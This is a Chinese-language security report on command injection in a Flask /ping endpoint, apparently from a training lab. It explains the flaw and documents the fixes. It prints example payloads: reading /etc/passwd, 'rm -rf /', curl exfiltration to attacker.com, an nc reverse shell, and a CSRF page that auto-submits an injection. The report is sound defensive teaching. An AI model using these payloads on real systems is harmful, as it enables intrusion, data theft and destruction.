# 命令注入漏洞分析与修复报告

| 项目 | 内容 |
|------|------|
| **项目路径** | `/opt/Class01/` |
| **涉及文件** | `app.py`、`templates/ping.html` |
| **修复数量** | 4 项漏洞 + 1 项风险 |

---

## 一、漏洞总览

| 序号 | 漏洞名称 | 严重程度 | OWASP 分类 | 修复状态 |
|:---:|---------|:-------:|-----------|:-------:|
| 1 | Ping 接口命令注入（shell=True + f-string） | 🔴 严重 | A03:2021 – 注入 | ✅ 已修复 |
| 2 | 任意系统命令执行（RCE） | 🔴 严重 | A03:2021 – 注入 | ✅ 已修复 |
| 3 | 执行结果直接回显（信息泄露） | 🟠 高危 | A04:2021 – 不安全设计 | ✅ 已修复 |
| 4 | Ping 接口无 CSRF 保护 | 🟡 中危 | A01:2021 – 越界访问控制 | ✅ 已修复 |
| 5 | 错误信息暴露内部路径 | 🟢 低危 | A05:2021 – 安全配置错误 | ✅ 已修复 |

---

## 二、漏洞详情

### 1. Ping 接口命令注入（shell=True + f-string）

**风险等级：🔴 严重**

**漏洞描述：**
`/ping` POST 路由使用 **f-string 拼接用户输入** 构建系统命令，并设置 **`shell=True`** 执行：

```python
# ❌ 修复前
ip = request.form.get("ip", "")           # 用户输入: 127.0.0.1; whoami
cmd = f"ping -c 3 {ip}"                   # "ping -c 3 127.0.0.1; whoami"
output = subprocess.check_output(cmd, shell=True, timeout=30)  # shell 解析两条命令！
```

**`shell=True` 的危险性：** 当 `shell=True` 时，字符串命令被传递给系统的 shell 解释器（`/bin/sh -c`）执行。shell 会解析其中的特殊字符（`;`、`|`、`&&`、`` ` ``、`$()`），导致多条命令依次执行。

**攻击验证（修复前）：**

| 输入 | 执行的命令 | 结果 |
|:----|:----------|:----|
| `127.0.0.1; whoami` | `ping -c 3 127.0.0.1; whoami` | ping 结果 + 当前用户名 |
| `127.0.0.1; id` | `ping -c 3 127.0.0.1; id` | ping 结果 + uid/gid |
| `127.0.0.1; ls /root` | `ping -c 3 127.0.0.1; ls /root` | ping 结果 + 根目录列表 |
| `127.0.0.1; cat /etc/passwd` | 读取系统用户列表 | 所有系统用户名泄露 |
| `127.0.0.1; curl http://attacker.com/$(whoami)` | 外带数据 | 将服务器信息发送到攻击者服务器 |
| `127.0.0.1; rm -rf /` | 删除文件系统（需要有执行权限）| **RCE + 系统损毁** |

---

### 2. 任意系统命令执行（RCE）

**风险等级：🔴 严重**

**漏洞描述：**
`shell=True` + `f-string` 拼接的组合使得攻击者可以在目标服务器上执行**任意系统命令**。

**攻击链：**

```
输入: 127.0.0.1; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc attacker.com 4444 > /tmp/f
→ 反向 Shell → 攻击者获得交互式 Shell 访问
→ 服务器完全沦陷！
```

**攻击面扩展：**
| 特殊字符 | 作用 | 示例 payload |
|:--------|:----|:------------|
| `;` | 命令分隔符 | `127.0.0.1; whoami` |
| `\|` | 管道 | `127.0.0.1\|whoami` |
| `&&` | 条件执行 | `127.0.0.1 && whoami` |
| `` ` `` | 命令替换（反引号）| `` 127.0.0.1 `whoami` `` |
| `$()` | 命令替换（美元括号）| `127.0.0.1 $(whoami)` |
| `&` | 后台执行 | `127.0.0.1 & whoami &` |
| `\n` | 换行符 | 换行后执行新命令 |

---

### 3. 执行结果直接回显（信息泄露）

**风险等级：🟠 高危**

**漏洞描述：**
命令执行的标准输出和错误输出直接通过模板返回给用户：

```python
# ❌ 修复前
output = subprocess.check_output(cmd, shell=True, ...)
result = output.decode('utf-8', errors='replace')  # 直接解码返回

except subprocess.CalledProcessError as e:
    result = e.output.decode('utf-8', errors='replace')  # 错误也返回！
```

**攻击场景：**
- 执行 `cat /etc/passwd` → 输出直接显示在页面上
- 执行 `ls -la /root` → 列出服务器目录结构
- 执行 `env` → 泄露环境变量（含 Secret Key 等敏感信息）

---

### 4. Ping 接口无 CSRF 保护

**风险等级：🟡 中危**

**漏洞描述：**
`/ping` 路由在 CSRF 中间件中被特意排除：

```python
# ❌ 修复前
if request.endpoint in ("feedback", "ping"):
    return  # 跳过 CSRF 检查！
```

**攻击场景：**
攻击者构造恶意页面，诱导已登录管理员访问，自动提交表单执行任意命令：
```html
<html>
<body>
  <form id="attack" action="http://target/ping" method="POST">
    <input name="ip" value="127.0.0.1; curl http://attacker.com/steal.php --data $(cat /etc/passwd)">
  </form>
  <script>document.getElementById('attack').submit();</script>
</body>
</html>
```

---

### 5. 错误信息暴露内部路径

**风险等级：🟢 低危**

**漏洞描述：**
异常捕获中直接将异常对象格式化返回：

```python
except Exception as e:
    result = f"执行错误: {e}"   # 暴露内部路径和系统信息
```

可能暴露的信息如：`[Errno 2] No such file or directory: 'ping'` 提示 ping 程序路径。

---

## 三、漏洞根源分析

```
┌──────────────────────────────────────────────────────────────┐
│                    命令注入漏洞根源                          │
│                                                              │
│  用户输入: 127.0.0.1; whoami                                 │
│          ↓                                                   │
│  f"ping -c 3 {ip}"                                          │
│          ↓                                                   │
│  "ping -c 3 127.0.0.1; whoami"  ← 两条命令！                │
│          ↓                                                   │
│  subprocess.check_output(cmd, shell=True)                    │
│          ↓                                                   │
│  /bin/sh -c "ping -c 3 127.0.0.1; whoami"                   │
│          ↓                                                   │
│  ① ping 127.0.0.1                                            │
│  ② whoami  ← 第二条命令被执行！                              │
│          ↓                                                   │
│  结果返回给用户 → 信息泄露 / RCE                              │
│                                                              │
│  ✅ 修复:                                                    │
│  ① is_safe_target() 白名单校验                               │
│  ② 使用参数列表方式，禁用 shell=True                          │
│  ③ CSRF Token 保护                                          │
└──────────────────────────────────────────────────────────────┘
```

### shell=True 的本质问题

| 执行方式 | 代码 | 是否经过 Shell | 命令注入风险 |
|:--------|:----|:-------------:|:----------:|
| `shell=True` | `check_output("ping "+ip, shell=True)` | ✅ → `/bin/sh -c` | 🔴 高危 |
| `shell=False`（默认）| `check_output(["ping", "-c", "3", ip])` | ❌ → 直接执行 | 🟢 安全 |

`shell=True` 时，字符串参数被传递给 `/bin/sh -c` 解析。Shell 会处理 `;`、`|`、`$()` 等特殊字符，这是命令注入的根本原因。

---

## 四、修复方案

### 修复 1：输入白名单校验（is_safe_target）

```python
# ✅ 修复后
def is_safe_target(target):
    """验证目标 IP 或域名是否合法，防止命令注入。"""
    ip_pattern = r'^(\d{1,3}\.){3}\d{1,3}$'
    domain_pattern = r'^[a-zA-Z0-9]([a-zA-Z0-9\-\.]*[a-zA-Z0-9])?$'
    if re.match(ip_pattern, target):
        parts = target.split('.')
        return all(0 <= int(p) <= 255 for p in parts)  # IP 每段范围校验
    if re.match(domain_pattern, target):
        return '.' in target and len(target) <= 253     # 域名必须有 . 且长度限制
    return False
```

校验效果：

| 输入 | IP正则 | 范围校验 | 域名正则 | 结果 |
|:----|:-----:|:--------:|:--------:|:----:|
| `8.8.8.8` | ✅ | ✅ | — | ✅ 通过 |
| `127.0.0.1` | ✅ | ✅ | — | ✅ 通过 |
| `google.com` | ❌ | — | ✅ | ✅ 通过 |
| `127.0.0.1; whoami` | ❌ | — | ❌ | ❌ 拦截 |
| `$(cat /etc/passwd)` | ❌ | — | ❌ | ❌ 拦截 |
| `999.999.999.999` | ✅ | ❌ | — | ❌ 拦截 |
| `localhost` | ❌ | — | ❌ 无点号 | ❌ 拦截 |

---

### 修复 2：使用参数列表替代 f-string + shell=True

```python
# ✅ 修复后
# 使用参数列表方式，禁用 shell=True
cmd = ["ping", "-c", "3", ip]
output = subprocess.check_output(cmd, stderr=subprocess.STDOUT, timeout=30)
```

列表方式与 shell 方式的对比：

```
输入: 127.0.0.1; whoami

shell=True:
  /bin/sh -c "ping -c 3 127.0.0.1; whoami"
  → ping + whoami 两条命令  ❌

shell=False（列表方式）:
  exec("ping", ["-c", "3", "127.0.0.1; whoami"])
  → ping 尝试连接名为 "127.0.0.1; whoami" 的主机
  → 只是一个无效的域名，不会执行第二条命令  ✅
```

---

### 修复 3：CSRF 保护覆盖 /ping

```python
# ✅ 修复后
# CSRF 中间件不再排除 /ping
# ping.html 表单添加 CSRF Token
```

```html
<!-- ✅ 修复后 -->
<form method="POST" action="/ping">
    <input type="hidden" name="csrf_token" value="{{ session.get('csrf_token', '') }}">
    ...
</form>
```

---

### 修复 4：异常信息收敛

```python
# ✅ 修复后
except subprocess.TimeoutExpired:
    result = "Ping 超时（30秒）"
except FileNotFoundError:
    result = "ping 命令未找到，请检查系统是否安装"
except Exception:
    result = "Ping 执行失败，请稍后重试"
```

---

## 五、修复前后代码对比

#### 修复前（4 个漏洞 + 1 风险）

```python
@app.route("/ping", methods=["GET", "POST"])
@login_required
def ping():
    if request.method == "POST":
        ip = request.form.get("ip", "")
        if ip:
            cmd = f"ping -c 3 {ip}"                    # ❌ f-string 拼接
            try:
                output = subprocess.check_output(
                    cmd, shell=True, ...               # ❌ shell=True
                )
                result = output.decode()               # ❌ 结果直接回显
            except Exception as e:
                result = f"执行错误: {e}"               # ❌ 异常信息泄露

    return render_template("ping.html", result=result)

# CSRF 中间件排除 /ping  ❌
if request.endpoint in ("feedback", "ping"):
    return
```

#### 修复后（全部修复）

```python
def is_safe_target(target):                              # ✅ 输入白名单校验
    # 仅允许合法 IP 或域名
    ...

@app.route("/ping", methods=["GET", "POST"])
@login_required
def ping():
    if request.method == "POST":
        ip = request.form.get("ip", "").strip()
        if ip:
            if not is_safe_target(ip):                   # ✅ 命令注入拦截
                result = "无效的 IP 地址或域名格式"
            else:
                cmd = ["ping", "-c", "3", ip]            # ✅ 参数列表方式
                try:
                    output = subprocess.check_output(
                        cmd, stderr=subprocess.STDOUT, timeout=30  # ✅ 无 shell=True
                    )
                    result = output.decode()
                except FileNotFoundError:
                    result = "ping 命令未找到"            # ✅ 异常信息收敛
                except Exception:
                    result = "Ping 执行失败"

    return render_template("ping.html", result=result)
```

```html
<!-- ✅ 表单添加 CSRF Token -->
<input type="hidden" name="csrf_token" value="{{ session.get('csrf_token', '') }}">
```

---

## 六、攻击验证

```
修复前（命令注入全部成功）:
  POST /ping ip=127.0.0.1; whoami          → 显示当前用户名  ❌
  POST /ping ip=127.0.0.1; cat /etc/passwd → 显示系统用户列表 ❌
  POST /ping ip=127.0.0.1; id              → 显示 uid/gid 信息 ❌
  无 CSRF Token 也能提交                    → 跨站伪造请求    ❌

修复后（命令注入全部拦截）:
  POST /ping ip=127.0.0.1                   → ping 正常执行   ✅
  POST /ping ip=8.8.8.8                     → ping 正常执行   ✅
  POST /ping ip=google.com                  → ping 正常执行   ✅
  POST /ping ip=127.0.0.1; whoami           → 无效的IP/域名  ✅
  POST /ping ip=$(cat /etc/passwd)          → 无效的IP/域名  ✅
  POST /ping ip=127.0.0.1 （无 CSRF Token） → 400 拒绝       ✅
```

---

## 七、命令执行安全最佳实践

| 措施 | 说明 | 优先级 |
|:----|------|:----:|
| **禁用 shell=True** | 使用参数列表 `["cmd", "arg1", "arg2"]` 方式 | 🔴 必须 |
| **输入白名单校验** | 用正则限制输入只能包含合法字符 | 🔴 必须 |
| **避免 f-string 拼命令** | 用户输入不应参与命令字符串构建 | 🔴 必须 |
| **最小权限原则** | Web 进程以最小权限运行 | 🟠 推荐 |
| **执行结果过滤** | 不要将原始命令输出直接返回给用户 | 🟠 推荐 |
| **超时限制** | 防止恶意命令长期占用 | 🟡 建议 |
| **沙箱执行** | 使用容器或 seccomp 限制系统调用 | 🟢 可选 |
| **白名单命令** | 仅允许执行预定义的命令列表 | 🟢 可选 |

---

**核心原则：永远不要将用户输入拼接到系统命令中。如果必须执行外部命令，使用列表参数方式传递参数，并对用户输入进行严格的白名单校验。shell=True 是一个危险开关，尽量避免使用。**
